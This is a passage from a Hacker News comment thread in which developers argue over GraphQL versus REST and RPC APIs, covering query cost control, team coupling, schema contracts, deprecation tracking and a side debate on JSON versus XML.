endpoint for each case. reply randomdata 2 hours agorootparentIt doesn't. That's literally what GraphQL was designed for: To provide a resolver that sits between high latency clients and all of the various REST/RPC services in order to roll up all of the requests at datacenter speeds into one in order to overcome the latency issues. But you still need all of the various single page REST/RPC endpoints to make use of GraphQL as it is intended. Some developers out there skip the REST/RPC part, making GraphQL their entire service, violating its principles. If it works it works, but it does not come tradeoff free. reply hansonkd 2 hours agorootparent? why do you need a REST endpoint with GraphQL? Nearly every language has a GraphQL engine that integrated directly with the database and exposed functions as GQL directly without REST at all. reply randomdata 2 hours agorootparentYou don't, obviously â€“ we already talked about how many don't. But if you don't have a graph of \"microservices\" in which to query, what do you need GraphQL for? Especially if all you are doing is returning the results from a database. The database will already have its own API. Why not just use it? The native API is always going be better than your attempt to translate. reply hansonkd 2 hours agorootparentBecause exposing your Database to the outside world is asinine. GQL sits between letting the frontend query semi-customizable queries and not having any customizability to select related resources. reply int_19h 41 minutes agorootparentI'm curious as to why you believe that exposing direct SQL over the database is \"asinine\" but GQL is fine, given that either one is very generic, and e.g. the security issues are very similar (as the article points out). reply randomdata 2 hours agorootparentprevNobody said you should expose your database to the outside world. Do you not understand the difference between APIs and services? reply hansonkd 1 hour agorootparentYou said > The database will already have its own API Where is this API coming from? You have to build it. I'm saying you should make those APIs graphql apis though a language framework and not REST apis because GQL consuming GQL is much better than GQL consuming REST. reply randomdata 1 hour agorootparentSomeone has to build it, but as long as you are using a popular DMBS the work is no doubt already done. All you need to do is stick your application-y bits in the middle â€“ same as you have to do with GraphQL. Computers aren't exactly magic. It's all just 1s and 0s at the end of the day. You can do just about anything and make it work. But there are tradeoffs to different approaches. If GraphQL is the best choice for working with databases, why don't DMBSes use it natively? reply realusername 2 hours agorootparentprevI don't think it would hold true for very long, devs will have specific cases which will pile into the definitions. That's why GraphQL examples usually focus on querying data from users and not how you are going to manage 10 different views of the same data. reply hansonkd 2 hours agorootparent> pile into the definitions That is how REST works but is the opposite of the way GQL works. You don't pile into existing defintions but extend the current definitions out. A team needing new data doesn't affect the consumption of other teams. which is not the case of REST where if one team needs to change a REST endpoint to return different shape of data, they have to verify the new shape with other teams. reply realusername 2 hours agorootparentWith REST, the endpoints are team based if you have even a semi-competent CTO so you never have this problem, you just check who owns the controller and that's it. With GQL though, good luck retracing who owns what field and what does it affect if you change the definition of what it returns, especially that you you are not even using it on the same language. Bonus points here if you are managing something outside of your control like a mobile app. reply hansonkd 2 hours agorootparentGQL you would only care about if someone removed a field not if someone added a field. How would adding a field change existing GQL calls return? Doesn't make sense. Also, Its about 1 line to set up CI to extract all GQL queries from a typescript project and do static analysis to check against the schema. But again you only care if someone deletes a field, and even if you have to delete it, at least the GQL schema has built in annotations for deprecation, something not in REST. reply realusername 1 hour agorootparentDeleting things happens all the time though. Yeah sure you can make it work with anything if you spend the extra effort but the ownership really isn't as defined as in REST. Is there code which have fuzzy or no ownership? Are there changes which affect other teams? Suddenly those became much harder questions to answer. reply hansonkd 1 hour agorootparentActually deleting happens rather rarely compared to adding. Its much easier to trace and debug what teams are using GQL fields than REST. What if one team is piggy backing on another teams exising rest endpoint and you dont know? same problem that would require some analysis of all code calling and endpoint to determine if a field is safe to delete. GQL makes this much simpler than REST. reply realusername 1 hour agorootparentOn one side you need to check which folder you are in, on the other side you need to do a static analysis of the whole current and past apps. I know there's some diverging opinions here but there's one which sounds definitely easier than the other. As for deletes, I work in a company with a good hundred devs so that happens weekly at least. reply raxxorraxor 4 hours agorootparentprevXML still has its usage and is excellent to quickly validate documents, but JSON clearly won in this use case because it was kept simple, stupid. reply aaronbrethorst 5 hours agorootparentprevHarder to get a promotion when youâ€™re doing something thatâ€™s old, boring, and just works. reply apantel 1 hour agorootparentThe closer you are to the cutting edge, the more sliced up youâ€™re gonna get. reply suzzer99 1 hour agorootparentprevEspecially if your job title has \"architect\" in it. reply TheSoftwareGuy 5 hours agorootparentprevI think us engineers have an inherent desire to try to innovate, and I think that is a good thing. Some problems will require a lot of wrong turns before finding the right path, but that is simply the nature of innovation reply nurple 4 hours agorootparentAgreed it's a good thing. Writing software today is still a slog that turns into a spaghetti bowl without focused intent by highly skilled devs. I think most devs realize this and really want there to be something better, and the only way to find something good is to find a lot of the bad around it first. I like the thought experiment of adding a new persisted/editable field to an entity in a web app, if you've done full-stack you know all the layers that need to be touched to accomplish this and how lame most of the work turns out to be. After doing that 20 times while iterating, any dev worth their salt starts to wonder why it sucks so bad still and how it could be made better, and some will actually try. reply LeonenTheDK 1 hour agorootparentprev> and most likely a lot of the software we write will cease to be running in a decade If only that were true in my experience. reply cess11 3 hours agorootparentprevJSON winning over XML is like saying CSV won over MySQL. They aren't equivalent. Much like CSV, JSON isn't particularly standardised and different parsers and writers will do different things in some situations. Usually it doesn't matter, but when it does you're probably in for a lot of pain. If you handle structured data and the structures might change over time, JSON isn't a good fit. Maybe you'll opt for JSON Schema, maybe that'll work for your use case, but with XML you can be quite sure it'll be reliable and well understood by generations of developers. The tooling is generally very good, commonly you can just point your programming language to the XSD and suddenly you have statically typed classes to program against. Perhaps you'd like to store the data in a RDBMS? You can probably generate the DB schema from the XSD. If you want you can just throw JSON into MongoDB instead, but there will be very important tradeoffs. Same goes for UI, you can write some XSLT based on the XML schema and suddenly you get web views directly from API responses. Or you could use those classes you generated and have your GUI code consume such objects. None of this is as easy with JSON as it is with XML, similar to how many things aren't as easy with CSV as with a RDBMS. reply svachalek 3 hours agorootparentWhat's missing in ECMA-404? Never had a problem with JSON parsers or writers, using it all day every day for decades. It's crappy in some ways, sure, like lack of full floating point support, but standardization is not an issue. XML is mostly already lost on the current generation of developers though, much less future developers. Protobuf and cousins generally do typed interchange more efficiently with less complexity. reply int_19h 11 minutes agorootparentIt's focused almost entirely on syntax and ignores semantics. For example, for numbers, all it says is that they are base-10 decimal floating point, but says nothing about permissible ranges or precision. It does not tell you that, for example, passing 64-bit numbers in that manner is generally a bad idea because most parsers will treat them as IEEE doubles, so large values will lose precision. Ditto for any situation where you need the decimal fraction part to be precise (e.g. money). RFC 8259 is marginally better in that it at least acknowledges these problems: This specification allows implementations to set limits on the range and precision of numbers accepted. Since software that implements IEEE 754 binary64 (double precision) numbers [IEEE754] is generally available and widely used, good interoperability can be achieved by implementations that expect no more precision or range than these provide, in the sense that implementations will approximate JSON numbers within the expected precision. A JSON number such as 1E400 or 3.141592653589793238462643383279 may indicate potential interoperability problems, since it suggests that the software that created it expects receiving software to have greater capabilities for numeric magnitude and precision than is widely available. Note that when such software is used, numbers that are integers and are in the range [-(2**53)+1, (2**53)-1] are interoperable in the sense that implementations will agree exactly on their numeric values. But note how this is still not actually guaranteeing anything. What it says is that implementations can set arbitrary limits on range and precision, and then points out that de facto this often means 64-bit floating point, so you should, at the very least, not assume anything better. But even if you only assume that, the spec doesn't promise interoperability. In practice the only reliable way to handle any numbers in JSON is to use strings for them, because that way the parser will deliver them unchanged to the API client, which can then make informed (hopefully...) choices on how to parse them based on schema and other docs. OTOH in XML without a schema everything is a string already, and in XML with a schema (which can be inline via xsi:type) you can describe valid numbers with considerable precision, e.g.: https://www.w3.org/TR/xmlschema-2/#decimal reply WorldMaker 1 hour agorootparentprevThere are a lot of proponents that some or all of the \"JSON5\" [1] improvements should be standardized by ECMA as well. Especially because there is a mish-mash of support for such things in some but not all parsers. (Writers are a different matter.) Primarily comments and trailing commas, are huge wish list items and the biggest reasons for all of the other \"many\" variant parsers (JSONC, etc). [1] https://json5.org/ reply int_19h 38 minutes agorootparentThis is more of a concern for JSON configs and other such uses that are directly exposed to humans, but not really for machine-generated and machine-consumed data. reply Xarodon 25 minutes agorootparentprevXML parsers suffer the same fragmentation issues that JSON parsers do. Go's XML parser straight-up emits broken XML when trying to output tags that have prefixed namespaces. reply jayd16 1 hour agorootparentprevIts not JSON over XML. They're saying JSON REST won over _XML and SOAP_. reply int_19h 32 minutes agorootparentThose two are kinda orthogonal, and while there was some overlap for adoption, it was fairly common to serve XML over REST early on (because more languages and frameworks had proven-quality XML parsers out of the box, so it was easier for the clients to handle). JSON won in the end mostly because it was easier to handle in JS specifically, which is what mattered for the frontend. Then other languages caught up with their own implementations, although in some cases it took a while - e.g. for .NET you had to use third-party libraries until 2019. reply DanielHB 8 hours agoparentprevGraphQL is very good for places where frontend and backend developers are isolated from each other (separate teams). Or rather places where you have data-producers and data-consumers as separate teams. If you have a big enough org eventually there will be many of such teams, interdisciplinary teams are not feasible at scale for everything. It allows teams to work with less communication overhead. It solves more of a human problems than a technical problems, if someone think there is no value in that and bare metal performance is paramount that person never worked in a big org. > RPC and REST are just more straightforward to monitor, log, cache, authorize and debug. In some ways yes, in others no. For example it can be near impossible to see if a deprecated field in a REST API is still being used and by which clients it is being used. With GraphQL this is fairly simple. Unfortunately GraphQL way of working is very different from normal REST APIs and often requires more complex server-side caching. The N+1 problem needs to be figured out upfront for every data-storage system used in the backend. reply BiteCode_dev 7 hours agorootparentThe problem is you delegate a lot of the query building to the client, hoping that it will not suddenly change your performance profile by being creative and that you will have not missed an obviously expensive use case coming. That's a huge bet, especially given that GraphQL is expensive in the first place, and given that the more you grow the API in size, the less you can actually map the cartesian product of all request params. reply strken 6 hours agorootparentI'm not sure this is any more or less of a problem for REST APIs. What if your engineers change $client/$server and the new version makes really expensive queries? Well, ask them not to do that, then when some of them inevitably ignore you, start to review their code, terminate long-running queries, batch or pool fanouts so they don't take anything down, monitor new releases and roll back if anything breaks, etc. If you're providing an external API like GitHub does, then that's a different story and I agree. reply barrkel 5 hours agorootparentIf you have separation between front and back end, then the back end team can elect to serve REST APIs which only permit selecting, filtering, grouping and pagination that they know they can support within defined latency bounds for a given traffic level. Thing get more problematic when there's vertical ownership for a feature, where the UI needs just a few extra things and you end up with a REST response which is fatter and fatter, in the interest of avoiding round trips and client-side joins. The problem with killing correct queries that take too long is that it shows up as intermittent failure that's dependent on server load and data cardinality. You might not find it in testing and it ships a bad experience to the customer before bugs are found. Whereas APIs which can't be so easily misused make it much harder to ship bugs. reply hansonkd 4 hours agorootparent> the back end team can select to serve REST APIs which only permit selecting, filtering, grouping and pagination that they know they can support within defined latency bounds for a given traffic level. Why do you think that they can't do that with GraphQL? GraphQL isn't open ended. Its a highly restricted syntax for calling nested resources. If a resource is expensive simply don't nest it and make it a top level field and it is the same as REST? Lots of nested resources are by default efficiently served by GraphQL because they are mostly returning single object foreign keys. Something that would take extra calls with REST. GraphQL can have the same restrictions and performance guarantees as REST but the later is not necessarily true because in REST there is no standard way to define nested resource access. reply clintonb11 4 hours agorootparentI think the point here is, if you have to involve a backend team to add restrictions to the graphql endpoints and try to make good educated guesses where those might be, then the idea of frontend not needing backend engineers to query whatever they need becomes less of an advantage. So is the complexity of setting up graphql and then having your backend team try and make sure no frontend engineers can do terrible queries better for the software than custom rest APIs where needed and standard resource APIs everywhere else. Obviously it depends on the project. But I find the complexity of setting up and managing graphql often isnâ€™t worth the pain, especially with schema first resource api designs and tooling like Googleâ€™s AIP linter. reply hansonkd 4 hours agorootparent> if you have to involve a backend team to add restrictions to the graphql endpoints and try to make good educated guesses where those might be, then the idea of frontend not needing backend engineers No because if you dont do that you have to involve more engineers anyways to build the REST endpoints and keep modifying the rest endpoints. GraphQL is also default restrictive (i.e. exposes nothing). You don't need to add engineers to make it restrictive. In Startups typically: -> Frontend changes most frequently -> Backend \"utility functions \" changes less -> Data model changes the least Without Graphql your \"backend\" ends up needing to have a lot of work and changes because it is constantly needing to be updated to the needs of the most frequent changes happening on the frontend. With GraphQL the only time you need to update the backend is when those \"utility\" functions change (i.e. 3rd party api calls, etc) or the data model changes. So you end up needing substantially less backend engineers. reply smaudet 3 hours agorootparent> With GraphQL the only time you need to update the backend is when those \"utility\" functions change (i.e. 3rd party api calls, etc) or the data model changes. This is akin to saying that \"directly exposing the database is easier, you only have to change things if the data changes\". And yes this is true, but when the data changes, or the environment changes, the paradigm falls apart a bit, no? Which is what the backend code was for, insulation from that. > In Startups typically: Yes, so for a short lived, non-scaled application its far easier to do it one way, and maybe that's fine for most small apps (that will never scale far). I suspect a lot of the push back comes from larger, less nimble, more backwards-compat focused organizations/apps. reply hansonkd 3 hours agorootparent> This is akin to saying that \"directly exposing the database is easier Far from it actually. I am saying that in practice the data and queries that you perform on your Database actually tend to stabilize and you add less and less as time goes on. By Allowing the frontend to select what combination of these pre-approved queries that you already approved it can use, you have to do less and less backend work when compared to REST where you have to do backend work for every query combination you want to serve. > maybe that's fine for most small apps (that will never scale far). I mean saying GQL doesn't scale for big apps is over looking one of the largest Corporate Software Orgs (FB) created and use it in production purposefully for managing large software APIs. reply smaudet 1 hour agorootparent> By Allowing the frontend to select what combination of these pre-approved queries that you already approved it can use Sure, so you are just filtering raw database access then. That doesn't make it any different - and, you still need to approve and filter these queries, so what exactly have you saved? I.e. either the front end engineers can change these filters, or not, so it amounts to the same thing in the case they can. > I mean saying GQL doesn't scale for big apps is over looking one of the largest Corporate Software Orgs (FB) created and use it in production purposefully for managing large software APIs. That's not a great argument, though, saying a large company with many resources is capable of supporting something does not make it a sustainable technical decision. They likely also have a very specific work structure they use to make it for them. In fact thats a strong reason not to use it, if it requires enterprise level resources to use it effectively. There is a big difference between technologies that scale to enterprise and technologies that require enterprise... It still comes down to, if you can achieve 99% of the same thing with autogenerated REST apis and a couple page specific apis, what, exactly, is worth the considerable increase in complexity for that remaining 1%? Making things regularly more complex is a hallmark of failed, bad technologies, and I suspect GraphQL will see the dustbin like SOAP did... reply hansonkd 1 hour agorootparentYou are bouncing back between it is ony for startups and it requires enterprise level maintenance. It can be used easily for both. > It still comes down to, if you can achieve 99% of the same thing with autogenerated REST apis and a couple page specific apis Because you can get 100% by autogenerating GQL APIs and 0 page specific apis. reply smaudet 1 hour agorootparent>You are bouncing back between it is ony for startups and it requires enterprise level maintenance. It can be used easily for both. No, I never said that. You are the one that brought FB into the equation. Just because it can be used for something does not mean that it should. I said that that approach doesn't scale well, especially for frequent data/model changes. For small apps, where as you say, you have few data changes, by all means embed your database as closely as possible to you end user code. Sqlite inside a c app or electron, e.g. No need for any API at all! Just raw query access. Its nice GQL to generate stuff for small non-changing web apps, I'm sure. But once you get into more performance oriented, data-migration-style stuff, if there's not good support for changing the data and reacting to the environment, then adding complexity (GQL) to an already complex situation is a Bad Idea. You never said what this 1% was, autogeneration is not a bonus when you already have to manually filter and route things. The simpler solution gets you there as well, with less fuss. You think you don't have page specific apis, but if you are doing the manual filtering, then you still have them, you are just \"hiding\" them inside another language, that doesn't have a clear benefit? At least you can't say what it is, without going in circles, another sign GQL is probably ultimately a garbage technology... reply BiteCode_dev 2 hours agorootparentprevBut you actually don't need to keep modifying the REST endpoints for most projects, that's what everybody is saying. The vast majority of projects don't gain anything from this flexibility, because you don't have suddenly a 1000 of farmvilles copy cat that need their own little queries. You just have bob that need an order by. reply jerf 5 hours agorootparentprevThere's a lot of relevant differences between REST & GraphQL. It is possible to construct a REST endpoint that simply can't do any of those things, and such construction is a mid-level developer task at best. For instance, pagination of \"all posts ever\" is not uncommon, and clients won't be shocked to deal with it. GraphQL is enough harder to characterize the performance of that it definitely qualifies as a change in quantity that is itself a change in quality. Hypothetically, both approaches are vulnerable to all the same issues, but GraphQL is far more vulnerable. reply hansonkd 4 hours agorootparentThis is Wrong. GraphQL only exposes what you ask it to. There are plenty of pagination plugins for GraphQL frameworks just as there are plugins to REST framework. GraphQL can be restrictive as REST if you want it to be. The point is GraphQL can be \"as restrictive\" as REST, but if you want to enable more efficient queries by knowing all the data that the frontend is requesting, you can. But the opposite isn't true of REST. With REST if you want more advanced functionality like that you have to define your own specification. reply BiteCode_dev 2 hours agorootparentBut then what's the point of using it if it's to get the limitation of REST? You get something more complex, more expensive to maintain, consuming more resources, and configure it to basically be REST with extra steps. reply hansonkd 2 hours agorootparent> more complex, more expensive to maintain, consuming more resources, Idk. Strawberry GQL and most GQL libraries are maybe equally as complex as the REST libraries for the same language. Strawberry and FastAPI I would say are equal in complexity and configuration. It would be hard for me to say GQL is more expensive or consumes more resources. Opposite of the purpose and most uses of GQL. reply BiteCode_dev 2 hours agorootparentIn stawberry you make a method per field you want to retrieve, I would say it is indeed more complex and costly. reply hansonkd 1 hour agorootparentWhat? Its a method per collection you want to return. or else it is a type annotation. Exactly as complex as FastAPI or any other typed system. reply strken 5 hours agorootparentprevSorry, what? The original suggestion was that a developer would change things and it would cause performance problems. That same developer can change either a REST system or a GraphQL system and introduce the same performance issues in the same way, probably by adding a horrible N+1 query, or unbounded parallelism, or unbounded anything else. Yeah, the client can't change the query if you don't let it specify a query, this is trivially true, but the developer can go break an API endpoint with the exact same result while trying to achieve the exact same business outcome. reply jerf 5 hours agorootparentThe much more constrained input of the REST query means that the effect of changes on the API are much more comprehensible. Performance testing a particular REST endpoint is generally practical, and if a dev doesn't do it, the responsibility is reasonably placed on them. GraphQL means that you may do something you think is completely innocent like changing some index but for some query you didn't anticipate it trashes the performance. The range of things the dev of a GraphQL endpoint must be keeping track of is much larger than a REST endpoint, arguably exponentially so (though generally with a low power factor in practice, the possible queries are still exponentially complicated), and taking on any form of exponential responsibility is generally something that you should do only as a last resort, even if you do think your powers will stay low. reply smaudet 3 hours agorootparentprev> What if your engineers change $client/$server and the new version makes really expensive queries? Yes, so the cost benefit here is not in favor of GraphQL. If both technologies ultimately suffer from the same issues (what to do about unpredictable clients), but one is far more complex to implement and use (GraphQL), then there's a clear winner. Spoiler, its not GraphQL. Page specific endpoints, I would argue, can do 99% of what GraphQL was trying to do. If you want to use it as some sort of template language for constructing page specific endpoints, that could be useful (the same way xml schema is useful for specifying complex xml documents). But you can optimize a page specific endpoint, and do it with REST-style endpoint to boot. Having a bunch of \"simple\" calls and optimizing for the \"complex\" ones that you need using metrics/analysis is what you should be doing, not creating a complex API that is far harder to break down into \"simple\" cases. reply andrewingram 38 minutes agorootparentWhen you build a GraphQL server, youâ€™re creating a system that outputs page-specific endpoints. They can be generated just-in-time (the default) or at build time (the general recommendation). The engineering work involved shifts from building individual endpoints to building the endpoint factory. This shift may or may not be worth the trade off, but there are definite advantages, especially from the perspective of whomever is building the client. And once you factor in the ease at which you can introduce partial streaming with defer and streamable (granted theyâ€™re still WIP spec-wise), the experience can be pretty sublime. reply afavour 5 hours agorootparentprevObviously depends on the API but a REST API that maps relatively cleanly to database queries is going to make it very clear on both the client and the server when itâ€™s not scaling well. If, at page load, Iâ€™m making 100 HTTP requests to fetch 100 assets then as a client side developer Iâ€™m going to know thatâ€™s bad practise and that we really ought to have some kind of multi-get endpoint. With GraphQL that gets muddy, from the client side Iâ€™m not really sure if what Iâ€™m writing is going to be a massive performance drag or not. reply sixdimensional 4 hours agorootparentprevEven a SQL query can suffer the same fate. Ever tried writing a SQL query against a distributed database that isnâ€™t optimized for that read path? I think thatâ€™s whatâ€™s really pointing out the root cause issues here, itâ€™s not purely GraphQLâ€™s problem, itâ€™s the problems inherent to distributed systems. reply tomrod 7 hours agorootparentprevI haven't done much more than toy projects in GraphQL. Is there no way to limit the query complexity/cost? Such as a statement timeout in postgres? reply BiteCode_dev 6 hours agorootparentAh but that's the beauty of GraphQL, a query can actually fetch data from several systems: the db, the cache, the search engine, etc. It's all abstracted away. But let's say you have a timeout, and they have a retry, then suddenly, your server is now spammed by all the clients retry again and again a query that worked a week ago, but today is too heavy because of a tiny change nobody noticed. And even if it's not the case, you can now break the client at any time because they decide to use a feature you gave them, but that you actually can't deal with right now. reply barrkel 5 hours agorootparentTo be clear, the main thing that's abstracted away are server round-trips and client-side joins. REST APIs can fetch data from different systems too. reply BiteCode_dev 2 hours agorootparentSure but queries are crafted in the client, that may know nothing about this, while a rest api, the requests are restricted and the queries are more likely under control of the server, which mean the backend will likely decide what fetches what and when. It takes a lot of work to actually ensure all possible combinations of graphql params hit exactly what you want in the backend, and it's easy to mess with it in the frontend. reply chrisandchris 6 hours agorootparentprevI'm not that much into GraphQL but I vaguely remember libraries that provide some kind of atteibutes you apply to entities/loaders and then pre-execution an estimated cost is calculated (and aborted if over a specified threshold). reply chuckadams 3 hours agorootparentAPI Platform for PHP is one of those graphql implementations that has a query cost limiter built in (it's binary, it just rejects queries that go over your configured complexity threshold). Shopify's graphql api is even fancier, where every query costs X amount of a limited number of \"credits\". The structure of gql itself makes costs easier to estimate (you have as many joins as you have bracket pairs, more or less), and some servers can recognize a directive in the schema to declare the \"real\" cost. reply tomrod 6 hours agorootparentprevThat's sort of my expectation too -- it would be nuts to provide a user facing system without bounds of some sort. reply cmgbhm 5 hours agorootparentprevThereâ€™s a free query depth. Thereâ€™s ways to do query cost but federating that then becomes really annoying. Coming from the security side, thereâ€™s always a long curve of explaining and an even longer curve of mitigating. I always am happy when I get an elegant query working. Often however I just find I wasted time looking for a clean 1 query solution when iteration by caller was the only solution. reply tshaddox 4 hours agorootparentprevWhen the clientâ€™s data requirements change, isnâ€™t there always a risk that the data loading performance profile will change? Surely that is always the case, if the client is composing multiple REST requests, or if thereâ€™s one RPC method per client page, or with any other conceivable data loading scheme. reply tuan 5 hours agorootparentprev> GraphQL is very good for places where frontend and backend developers are isolated from each other (separate teams) What do you mean by \"backend developer\" ? The one who creates the GraphQL endpoints for UI to consume ? reply dudeinjapan 8 hours agorootparentprevCouldn't disagree more. GraphQL encourages tight-coupling--the Frontend is allowed to send any possible query to the Backend, and the Backend needs to accommodate all possible permutations indefinitely and with good performance. This leads to far more fingerpointing/inefficiency in the log run, despite whatever illusion of short-term expediency it creates. It is far better for the Backend to provide Frontend a contract--can do it with OpenAPI/Swagger--here are the endpoints, here are the allowed parameters, here is the response you will get--and we will make sure this narrowly defined scope works 100% of the time! reply DanielHB 6 hours agorootparent> It is far better for the Backend to provide Frontend a contract It sure is better for the backend team, but the client teams will need to have countless meetings begging to establish/change a contract and always being told it will come in the next sprint (or the one after, or in Q3). > This leads to far more fingerpointing/inefficiency in the log run, despite whatever illusion of short-term expediency it creates. It is true it can cause these kind of problems, but they take far, far, far less time than mundane contract agreement conversations. Although having catastrophic failures is usually pretty dire when they do happen, but there are a lot of ways of mitigating as well like good monitoring and staggered deployments. It is a tradeoff to be sure, there is no silver bullet. reply finack 3 hours agorootparentI never understood why this was such a big deal... \"Hey, we need an endpoint to fetch a list of widgets so we can display them.\" \"Okay.\" Is that so difficult? Maybe the real problem lies in poor planning and poor communication. reply jpalawaga 5 hours agorootparentprevtrying to solve org problems with tech just creates more problems, allthewhile not actually solving the original problem. reply clintonb11 4 hours agorootparentThis is what I wanted to say too. If your backend team is incapable of rapidly adding new endpoints for you, they probably are going to create a crappy graphql experience and not solve those problems either. So many frontend engineers on here saying that graphql solves the problem they had with backend engineers not being responsive or slow, but that is an org problem, not a technology problem. reply dudeinjapan 3 hours agorootparentAt TableCheck, our frontend engineers started raising backend PRs for simple API stuff. If you use a framework like Rails, once you have the initial API structure sketched out, 80% of enhancements can be done by backend novices. reply smaudet 3 hours agorootparentprevYup. And the solution to that org problem is for the front engineers to slow down, and help out the \"backend\" engineers. The complexity issues faced by the back-end are only getting worse with time, the proper solution is not adding more complexity to the situation, but paying down the technical debt in your organization. If your front-end engineers end up twiddling their thumbs (no bugs/hotfixes), perhaps there is time (and manpower) to try to design and build a \"new\" system that can cater to the new(er) needs. reply DanielHB 3 hours agorootparentGraphQL is the quintessential move fast and break things technology, I have worked in orgs and know other people who have done so in other orgs where getting time from other teams is really painful. It is usually caused by extreme pressure to deliver things. What ends up happening is the clients doing work arounds to backend problems which creates even more technical debt reply beeboobaa3 8 hours agorootparentprevNot to mention the fact that GraphQL allows anyone messing with your API to also execute any query they want. Then you start getting into query whitelisting which adds a lot of complexity. reply chuckadams 2 hours agorootparentprevMost REST APIs I've seen in the wild just send the entire object back by default because they have no idea which fields the client needs. Most decent REST API implementations do support a field selection syntax in the query string, but it's rare that they'll generate properly typed clients for it. And of course OpenAPI has no concept of field selection, so it won't help you there either. With my single WordPress project I found that WP GraphQL ran circles around the built-in WP REST API because it didn't try to pull in the dozens of extra custom fields that I didn't need. Not like it's hard to outdo anything built-in to WP tho... reply fire_lake 5 hours agorootparentprevA GraphQL schema is a contract though. And the REST API can still get hammered by the client - they could do an N + 1 query on their side. With GraphQL at least you can optimize this without adding a new endpoint. reply dudeinjapan 3 hours agorootparentYes, GraphQL is a \"contract\" in the sense that a blank check is also a \"contract\". reply arcticfox 3 hours agorootparentYou can whitelist queries in most systems though. In development mode allow them to run whatever query, and then lock it in to the whitelist for production. If that type of control is necessary. reply RHSeeger 7 hours agorootparentprevCan you explain what you mean by this? The GraphQL API you expose allows only a certain schema. Sure, callers can craft a request that is slow because it's asking for too much, but - Each individual thing available in the request should be no less timely to handle than it would via any other api - Combining too many things together in a single call isn't a failing of the GraphQL endpoint, it's a failing of the caller; the same way it would be if they made multiple REST calls Do you have an example of a call to a GraphQL API that would be a problem, that wouldn't be using some other approach? reply serpix 7 hours agorootparentThen we just come back full round trip to REST where the backend clearly defines what is allowed and what is returned. So using GraphQL it is unnecessary complicated to safeguard against a caller querying for all of the data and then some. For example the caller queries nested structures ad infinitum possibly even triggering a recursive loop that wakes up somebody at 3am. reply danielheath 6 hours agorootparentprevThe problem is that the client team can - without notice - change their query patterns in a way that creates excess load when deployed. When you use the \"REST\" / JSON-over-HTTP pattern which was more common in 2010, changes in query patterns necessarily involve the backend team, which means they are aware of the change & have an opportunity to get ahead of any performance impact. reply jerf 5 hours agorootparentMy blocker on ever using GraphQL is generally if you've got enough data to need GraphQL you're hitting a database of some kind... and I do not generally hand direct query access to any client, not even other projects within the same organization, because I've spent far too much time in my life debugging slow queries. If even the author of a system can be surprised by missing indices and other things that cause slow queries, both due to initial design and due to changes to how the database decides to do things as things scale up, how can I offload the responsibility of knowing what queries will and will not complete in a reasonable period of time to the client? They get the power to run anything they want and I get the responsibility of having to make sure it all performs and nobody on either side has a contract for what is what? I've never gotten a good answer to that question, so I've never even considered GraphQL in such systems where it may have made sense. I can see it in something big like Jira or GitHub to talk to itself, so the backend & frontend teams can use it to decouple a bit, and then if something goes wrong with the performance they can pick up the pieces together as still effectively one team. But if that crosses a team boundary the communication costs go much higher and I'd rather just go through the usual \"let's add this to the API\" discussions with a discrete ask rather than \"the query we decided to run today is slow, but we may run anything else any time we feel like it and that has to be fast too\". reply foobarian 4 hours agorootparentIt seems there is a recent trend of using adapters that expose data stores over graphql automatically, which is kind of scary. The graphql usage I'm used to works more or less the same as REST. You control the schema and the implementation, you control exactly how much data store access is allowed, etc. It's just like REST except the schema syntax is different. The main advantage of GraphQL IMO is the nice introspection tools that frontend devs can use, i.e. GraphiQL and run queries from that UI. It's like going shopping in a nice supermarket. reply ttfkam 40 minutes agorootparentNot particularly scary. For something like Hasura, resolvers are opt-in, not opt-out. So that should alleviate some of your concerns off the bat. For Postgraphile, it leans more heavily on the database, which I prefer. Set up some row-level access policies along with table-level grant/revoke, and security tends to bubble up. There's no getting past a UI or middleware bug to get the data when the database itself is denying access to records. Pretty simple to unit test, and much more resistant to data leakage when the one-off automation script doesn't know the rules. I also love that the table and column comments bubble up automatically as GraphiQL resolver documentation. Agreed about the introspection tools. I can send a GraphiQL URL to most junior devs with little to no SQL experience, and they'll get data to their UI with less drama than with Swagger interfaces IMO. (Though Swagger tends to be pretty easy too compared to the bad old days.) reply foobarian 5 hours agorootparentprev> changes in query patterns necessarily involve the backend team, How does this follow? A client team can decide to e.g. put up a cross-sell shelf on a low-traffic page by calling a REST endpoint with tons of details and you have the same problem. I don't see the difference in any of these discussions, the only thing different is the schema syntax (graphql vs. openapi) reply int_19h 25 minutes agorootparentGQL is far more flexible wrt what kind of queries it can do (and yes, it can be constrained, but this flexibility is the whole point). Which means that turning a cheap query into an expensive one accidentally is very easy. A hand-coded REST endpoint will give you a bunch of predefined options for filtering, sorting etc, and the dev who implements it will generally assume that all of those can be used, and write the backing query (and create indices) accordingly. reply gedy 5 hours agorootparentprev> the Frontend is allowed to send any possible query to the Backend It's really not, it's not exposing your whole DB or allowing random SQL queries. > It is far better for the Backend to provide the Frontend a contract GraphQL does this - it's just called the GraphQL \"schema\". It's not your entire database schema. reply afiori 8 hours agorootparentprev> In some ways yes, in others no. For example it can be near impossible to see if a deprecated field in a REST API is still being used and by which clients it is being used. With GraphQL this is fairly simple. You should log deprecation warnings. But also if the client is composing urls/params manually then you are not doing REST, you are doing RPC. Rest APIs should mainly use HATEOAS hyperlinks to obtain a resource. that is clients almost always call links you have provided in other reponses (starting from a main entrypoint) reply flashgordon 4 hours agoparentprev>> Fun fact; in both these projects the original devs who set it up were no longer involved. Probably spreading their evangalism further elsewhere. Ah this brings up bitter memories. Team I was managing was roped in to become the first graphql framework (nay platform) the ivory tower (central architecture run by the cto) team was building and trying to shove down the rest of the company. This was during the graphql craze around 5 years ago. The principal engineer leading it was even preemptively promoted to distinguished engineer for future contributions. Fast-forward 5 years project was disbanded due to massive migration, cost and complexity problems. DE still lauded for experimentation heroism and evangelism. I think he is now pushing the latest flavors of the month to go for the next promo! reply hinkley 2 hours agoparentprevI knew we were in trouble when we started having to sort the query criteria in order to support caching of requests. If I use graphQL again itâ€™ll only be for admin features. Anything where very few users will use it and very infrequently. Preferably in spots where caching works against the workflow. OLAP vs OLTP. GraphQL is really about reducing friction between teams. High functioning distributed systems all have two qualities in common: work stealing and back pressure. Without back pressure there is nothing to stop the project from running off a cliff. reply taeric 2 hours agoparentprevThat fun fact bothers me at a fundamental level. I've seen it happen so many times and is really painful when the people were promoted out of the place. Even worse when they are good developers, but often in a cowboy style where they confuse their energy for some fundamental efficiency of what they were doing. reply bryanrasmussen 2 hours agoparentprev>And both these projects had clear signs of \"learning-on-the-go\" with loads of bad practices I think two projects having loads of bad practices is too small a dataset to really assume anything, you sort of need to see widespread \"bad practices\" in the tech to be able to determine that the bad practice is actually the norm practice and there is perhaps a 